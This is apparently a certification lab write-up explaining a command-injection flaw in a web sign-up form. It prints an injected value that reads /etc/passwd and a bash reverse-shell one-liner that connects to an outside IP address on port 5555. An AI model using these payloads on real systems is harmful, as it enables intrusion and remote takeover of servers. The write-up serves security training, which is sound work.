---
title: Challenge 14:The Unseen Obvious
date: 2024-05-15 05:06:00 +0800
categories: [Write-Up, CWAE]
tags: [Cert, Write-Up]     ## TAG names should always be lowercase
description: This is a detailed writeup created for challenges associated with the Certified Web AppSecurity Expert (CWAE) certification. 
---

## Challenge/Task

1. Command Injection

**Proof-of-Concept (POC):**

Command injection is a security vulnerability that allows attackers to execute arbitrary commands on a system through vulnerable application inputs. On the sign-up page, there are 4 input field. One of the field vulnerable to the command injection. I send a command at the username field , “;cat /etc/passwd;” to fetch list of users and the server respond to it. 

![POC-otb](/img/cwae/tuo1.png){: w="400" h="400" }{: .normal }
![POC-otb](/img/cwae/tuo2.png){: w="400" h="400" }{: .normal }

We can try to get a reverse shell here by using this command
```jsx
;echo "bash -i >& /dev/tcp/143.198.205.200/5555 0>&1" >> f.sh;chmod +x f.sh;bash f.sh
```

This command attempts to append a line to a file named f.sh, which, when executed, will open a reverse shell to the IP address 143.198.205.200 on port 5555. Then, it makes the file executable and runs it using Bash.

Listening to port 5555.

![POC-otb](/img/cwae/tuo3.png){: w="400" h="400" }{: .normal }

We got a reverse shell after clicking the “Sign-Up” button. 

![POC-otb](/img/cwae/tuo4.png){: w="400" h="400" }{: .normal }

To proof it, I run id and whoami command to show the server belongs to the victim. 
![POC-otb](/img/cwae/tuo5.png){: w="400" h="400" }{: .normal }